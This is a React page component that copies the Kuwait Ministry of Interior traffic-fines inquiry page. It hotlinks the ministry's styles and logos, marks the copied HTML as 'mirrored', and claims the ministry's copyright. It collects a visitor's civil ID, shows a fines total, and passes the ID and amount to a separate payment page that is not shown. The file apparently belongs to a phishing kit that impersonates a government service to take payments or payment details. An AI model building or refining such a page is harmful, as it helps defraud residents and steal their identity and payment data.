import React, { useState, useEffect } from 'react';
import { useLocation } from "wouter";
import { trpc } from "@/lib/trpc";
import { useToast } from "@/hooks/use-toast";

export default function Home() {
  const [, setLocation] = useLocation();
  const { toast } = useToast();
  const [civilId, setCivilId] = useState("");
  const [enquiryType, setEnquiryType] = useState("1");
  const [results, setResults] = useState<any>(null);
  const [isSearching, setIsSearching] = useState(false);

  const queryMutation = trpc.fines.query.useMutation({
    onSuccess: (data) => {
      setIsSearching(false);
      if (data.success) {
        setResults(data);
        toast({ title: "تم جلب البيانات", description: `تم العثور على ${data.fines.length} مخالفات` });
      } else {
        toast({ variant: "destructive", title: "خطأ", description: data.errorMessage || "فشل الاستعلام" });
      }
    },
    onError: (err) => {
      setIsSearching(false);
      toast({ variant: "destructive", title: "خطأ", description: err.message });
    }
  });

  const handleInquire = () => {
    if (civilId.length < 8) {
      toast({ variant: "destructive", description: "يرجى إدخال الرقم المدني بشكل صحيح" });
      return;
    }
    setIsSearching(true);
    queryMutation.mutate({ civilId, enquiryType: enquiryType as "1" | "2", lang: "ar" });
  };

  const handlePay = () => {
    if (!results) return;
    sessionStorage.setItem("paymentData", JSON.stringify({
      selectedFines: results.fines,
      totalAmount: results.totalAmount,
      civilId: civilId
    }));
    setLocation("/payment");
  };

  useEffect(() => {
    // Inject MOI Official Styles
    const links = [
      "https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css",
      "https://www.moi.gov.kw/main/lib/fontawesome/v7/css/all.css",
      "https://www.moi.gov.kw/main/css/site.css?v=go_4IccMhw1NChPOSH_W7AbpThLoN7-zMHFe4trNRE0"
    ];
    links.forEach(href => {
      if (!document.querySelector(`link[href="${href}"]`)) {
        const link = document.createElement('link');
        link.rel = 'stylesheet';
        link.href = href;
        document.head.appendChild(link);
      }
    });

    // Handle interactions in the mirrored HTML
    const interval = setInterval(() => {
      const input = document.getElementById('civilId') as HTMLInputElement;
      const select = document.getElementById('enquiryType') as HTMLSelectElement;
      const btn = document.getElementById('btnEnquire');

      if (input && !input.dataset.bound) {
        input.oninput = (e) => setCivilId((e.target as HTMLInputElement).value);
        input.dataset.bound = "true";
      }
      if (select && !select.dataset.bound) {
        select.onchange = (e) => setEnquiryType((e.target as HTMLSelectElement).value);
        select.dataset.bound = "true";
      }
      if (btn && !btn.dataset.bound) {
        btn.onclick = (e) => {
          e.preventDefault();
          handleInquire();
        };
        btn.dataset.bound = "true";
      }
    }, 500);

    return () => clearInterval(interval);
  }, [civilId, enquiryType, results]);

  return (
    <div className="moi-mirrored-page" dir="rtl">
      <style>{`
        .moi-mirrored-page { background-color: #e9e6de; min-height: 100vh; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        .results-modal {
          position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
          background: white; padding: 25px; border-radius: 12px; box-shadow: 0 10px 40px rgba(0,0,0,0.2);
          z-index: 10000; width: 90%; max-width: 450px; text-align: center; border: 3px solid #000576;
        }
        .loading-overlay {
          position: fixed; top: 0; left: 0; right: 0; bottom: 0;
          background: rgba(0,0,0,0.4); display: flex; justify-content: center; align-items: center; z-index: 10001;
        }
      `}</style>

      {/* Mirrored Body Content with Mobile Support */}
      <div dangerouslySetInnerHTML={{ __html: `
        <div style="background-image: url('https://www.moi.gov.kw/main/images/assets/common/bg-pattern.png'); background-repeat: repeat; min-height: 100vh;">
          <div class="container">
            <header class="pt-3">
              <div class="row align-items-center">
                <div class="col-4 col-md-2 text-center">
                  <img src="https://www.moi.gov.kw/main/images/assets/common/logo-moi.svg" style="height: 90px;">
                </div>
                <div class="col-8 col-md-10 text-right">
                  <img src="https://www.moi.gov.kw/main/images/assets/common/ar/state-of-kuwait.svg" style="height: 25px; margin-bottom: 5px;"><br>
                  <img src="https://www.moi.gov.kw/main/images/assets/common/ar/ministry-of-interior.svg" style="height: 20px;">
                </div>
              </div>
            </header>

            <nav class="navbar navbar-expand-lg navbar-dark mt-3" style="background-color: #000576; border-radius: 5px;">
              <div class="container">
                <span class="navbar-toggler-icon"></span>
                <div class="collapse navbar-collapse show">
                  <ul class="navbar-nav ml-auto">
                    <li class="nav-item active"><a class="nav-link" href="#">الرئيسيــة</a></li>
                    <li class="nav-item"><a class="nav-link" href="#">الخدمات الإلكترونيـة</a></li>
                  </ul>
                </div>
              </div>
            </nav>

            <div class="row mt-4">
              <div class="col-lg-3 d-none d-lg-block">
                <div class="list-group" style="background-color: #000576; border-radius: 5px;">
                  <a href="#" class="list-group-item list-group-item-action text-white bg-transparent border-light d-flex justify-content-between align-items-center">
                    الخدمات الالكترونية لرخص السوق
                    <img src="https://www.moi.gov.kw/main/images/assets/general-traffic/ico-renew-license.svg" style="width: 22px;">
                  </a>
                  <a href="#" class="list-group-item list-group-item-action text-white bg-transparent border-light d-flex justify-content-between align-items-center">
                    دفع المخالفات
                    <img src="https://www.moi.gov.kw/main/images/assets/common/ico-payment.svg" style="width: 22px;">
                  </a>
                </div>
              </div>

              <div class="col-lg-9">
                <div class="card p-4 shadow-sm" style="background: rgba(255,255,255,0.7); border: 1px solid #ddd; border-radius: 10px;">
                  <div class="text-center mb-4">
                    <img src="https://www.moi.gov.kw/main/images/assets/general-traffic/logo-general-traffic.svg" style="height: 70px;">
                    <h5 class="mt-2" style="color: #000576; font-weight: bold;">الإدارة العامة للمرور</h5>
                    <hr style="width: 40%; border-top: 2px solid #000576;">
                  </div>

                  <div class="form-group text-right">
                    <label class="font-weight-bold" style="color: #000576;">Enquiry Type</label>
                    <select id="enquiryType" class="form-control text-right">
                      <option value="1">الأفراد</option>
                      <option value="2">الشركات</option>
                    </select>
                  </div>

                  <div class="form-group text-right">
                    <label class="font-weight-bold" style="color: #000576;">الرقم المدني أو الرقم الموحد</label>
                    <input type="text" id="civilId" class="form-control text-right" placeholder="أدخل الرقم المدني">
                  </div>

                  <button id="btnEnquire" class="btn btn-outline-primary btn-block font-weight-bold" style="border-color: #000576; color: #000576; height: 45px;">إستعلم</button>
                  
                  <p class="text-center mt-3 small font-weight-bold" style="color: #333;">
                    بعد إجراء عملية الدفع.. يرجى عدم محاولة الدفع مرة أخرى حيث يجرى تحديث البيانات خلال 15 دقيقة
                  </p>

                  <div class="d-flex justify-content-center mt-3">
                    <span class="badge badge-success p-2 m-1" style="font-size: 11px;">قابلة للدفع الكترونياً</span>
                    <span class="badge badge-danger p-2 m-1" style="font-size: 11px;">غير قابلة للدفع الكترونياً</span>
                  </div>
                </div>
              </div>
            </div>

            <footer class="mt-5 p-4 text-center text-white" style="background-color: #000576; border-radius: 10px 10px 0 0;">
              <div class="mb-3">
                <img src="https://www.moi.gov.kw/main/images/assets/social-media/ico-youtube.svg" class="mx-2" style="width: 20px;">
                <img src="https://www.moi.gov.kw/main/images/assets/social-media/ico-instagram.svg" class="mx-2" style="width: 20px;">
                <img src="https://www.moi.gov.kw/main/images/assets/social-media/ico-twitter.svg" class="mx-2" style="width: 20px;">
              </div>
              <p class="m-0 small">© جميع الحقوق محفوظة لوزارة الداخلية-دولة الكويت - 2026</p>
            </footer>
          </div>
        </div>
      ` }} />

      {isSearching && (
        <div className="loading-overlay">
          <div className="spinner-border text-white" role="status"></div>
        </div>
      )}

      {results && (
        <div className="results-modal">
          <h5 className="font-weight-bold mb-4" style={{color: '#000576'}}>نتائج الاستعلام</h5>
          <div className="text-right mb-4" style={{fontSize: '15px'}}>
            <p><strong>عدد المخالفات:</strong> {results.fines.length}</p>
            <p><strong>الإجمالي المستحق:</strong> <span className="text-danger font-weight-bold" style={{fontSize: '18px'}}>{results.totalAmount} د.ك</span></p>
          </div>
          <div className="d-flex gap-2">
            <button className="btn btn-primary flex-grow-1 font-weight-bold" style={{backgroundColor: '#000576', height: '45px'}} onClick={handlePay}>دفع الآن</button>
            <button className="btn btn-secondary flex-grow-1 font-weight-bold" style={{height: '45px'}} onClick={() => setResults(null)}>إغلاق</button>
          </div>
        </div>
      )}
    </div>
  );
}
